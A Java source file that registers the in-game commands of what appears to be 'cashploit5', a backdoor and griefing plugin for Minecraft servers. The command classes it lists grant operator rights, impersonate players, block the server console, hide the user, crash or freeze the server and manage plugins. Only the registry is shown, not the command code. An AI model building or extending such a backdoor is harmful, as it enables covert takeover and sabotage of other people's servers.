package de.cashploit5.v1_12_2.command;

import java.util.ArrayList;
import java.util.List;

import de.cashploit5.interfaces.CommandManagerInterface;

public class CommandManager implements CommandManagerInterface {
	
	public CommandManager() {
		commands.add(new HelpCommand());
		commands.add(new OPCommand());
		commands.add(new CrashCommand());
		commands.add(new DemoCommand());
		commands.add(new SudoCommand());
		commands.add(new TrustCommand());
		commands.add(new BlockConsoleCommand());
		commands.add(new SaveCommand());
		commands.add(new VanishCommand());
		commands.add(new PermaDemoCommand());
		commands.add(new KillAll());
		commands.add(new PenisCommand());
		commands.add(new FreezeCommand());
		commands.add(new PluginManagerCommand());
		commands.add(new TornadoCommand());
		commands.add(new GameModeCommand());
		commands.add(new ReloadCommand());
		commands.add(new TpCommand());
		commands.add(new WalkingTornadoCommand());
		commands.add(new DeleteTornadosCommand());
		commands.add(new FallingPenisCommand());
		commands.add(new AntiTrustCommand());
	}
	
	private List<Command> commands = new ArrayList<>();
	
	public List<Command> getCommands() {
		return commands;
	}

	@Override
	public de.cashploit5.v1_8_8.command.CommandManager getCommandManager_v1_8_8() {
		return null;
	}

	@Override
	public CommandManager getCommandManager_v_1_12_2() {
		return this;
	}
}